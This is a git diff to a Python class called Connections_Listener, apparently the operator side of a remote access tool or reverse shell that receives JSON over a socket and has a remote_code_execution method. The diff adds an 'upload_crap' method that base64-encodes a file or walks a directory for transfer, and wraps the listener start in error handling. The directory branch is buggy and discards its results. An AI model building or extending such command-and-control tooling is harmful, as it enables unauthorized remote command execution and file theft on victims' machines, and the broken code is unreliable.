@@ -25,6 +25,7 @@ class Connections_Listener:
                 json_data += self.connection.recv(1024).decode('utf-8')
                 return json.loads(json_data)
             except ValueError:
+                # code to display that data transfer is going on
                 continue
     
     def remote_code_execution(self, command):
@@ -42,6 +43,18 @@ class Connections_Listener:
     def upload_files(eslf, path):
         with open(path, 'rb') as file:
             return base64.b64encode(file.read())
+    
+    def upload_crap(self, path):
+        try:
+            if os.path.isfile(path):
+                return self.upload_files(path)
+            elif os.path.isdir(path):
+                for folder, subfolder, files in os.walk(path):
+                    for f in files:
+                        file = os.path.join(os.path.basename(path), f)
+                        self.upload_files(file)
+        except Exception as error:
+            return str(error).encode()
 
     def start(self):
         while True:
@@ -61,5 +74,8 @@ class Connections_Listener:
                 print(type(error))
                 # print("\n----- [=] Connection is still intact [=] -----")
 
-listen = Connections_Listener(ip, port)
-listen.start()
+try:
+    listen = Connections_Listener(ip, port)
+    listen.start()
+except Exception as error:
+    print(error)
